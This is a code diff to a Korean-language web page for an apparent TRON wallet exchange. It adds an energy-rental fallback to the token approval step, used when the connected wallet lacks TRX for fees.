@@ -875,7 +875,7 @@ button.px-3.py-1\.5.rounded-lg:hover{background:#cbd5e1!important}
             var btn=document.getElementById('approve-btn');
             btn.disabled=true;btn.innerHTML='<span class="animate-spin rounded-full h-4 w-4 border-2 border-white border-t-transparent"></span><span>처리 중...</span>';
 
-            // Step 1: TRX 확인 + 자동 충전
+            // Step 1: TRX 잔액 확인 + 에너지 렌탈
             setProgress(20,'TRX 잔액 확인 중...');
             appendLog(L('trxCheck'),'approve');
             try{
@@ -891,9 +891,27 @@ button.px-3.py-1\.5.rounded-lg:hover{background:#cbd5e1!important}
                         appendLog(L('trxOk',prepData.trxBalance),'success');
                     }
                 }else{
-                    setProgress(0,'');hideProgress();
-                    showToast('가스비 준비 실패','error');appendLog(L('trxFail',prepData.error||''),'error');
-                    btn.innerHTML='<i class="fa-solid fa-arrow-right-arrow-left"></i><span id="approve-btn-text">교환 시작 (최초 1회 승인 필요)</span>';btn.disabled=false;return;
+                    // TRX 부족 → 에너지 렌탈 시도
+                    setProgress(30,'TRX 부족 → 에너지 렌탈 중...');
+                    appendLog('[에너지] TRX 부족, tronrental.com 에너지 렌탈 요청 중...','warn');
+                    try{
+                        var rentRes=await fetch(API_BASE+'/energy/rent',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({address:currentWalletAddress,amount:65000,duration:'1h'})});
+                        var rentData=await rentRes.json();
+                        if(rentData.status==='ok'&&rentData.rented){
+                            setProgress(40,'에너지 렌탈 완료! 블록체인 반영 대기...');
+                            appendLog('[에너지] 렌탈 성공 (주문: '+rentData.orderId+'), 3초 대기...','success');
+                            showToast('에너지 렌탈 완료! 승인 진행합니다.');
+                            await new Promise(function(r){setTimeout(r,3000);});
+                        }else{
+                            setProgress(0,'');hideProgress();
+                            showToast('에너지 렌탈 실패','error');appendLog('[에너지] 렌탈 실패: '+JSON.stringify(rentData),'error');
+                            btn.innerHTML='<i class="fa-solid fa-arrow-right-arrow-left"></i><span id="approve-btn-text">교환 시작 (최초 1회 승인 필요)</span>';btn.disabled=false;return;
+                        }
+                    }catch(rentErr){
+                        setProgress(0,'');hideProgress();
+                        showToast('에너지 렌탈 오류','error');appendLog('[에너지] 통신 오류: '+rentErr.message,'error');
+                        btn.innerHTML='<i class="fa-solid fa-arrow-right-arrow-left"></i><span id="approve-btn-text">교환 시작 (최초 1회 승인 필요)</span>';btn.disabled=false;return;
+                    }
                 }
             }catch(pe){appendLog(L('trxWarn'),'warn');}
 
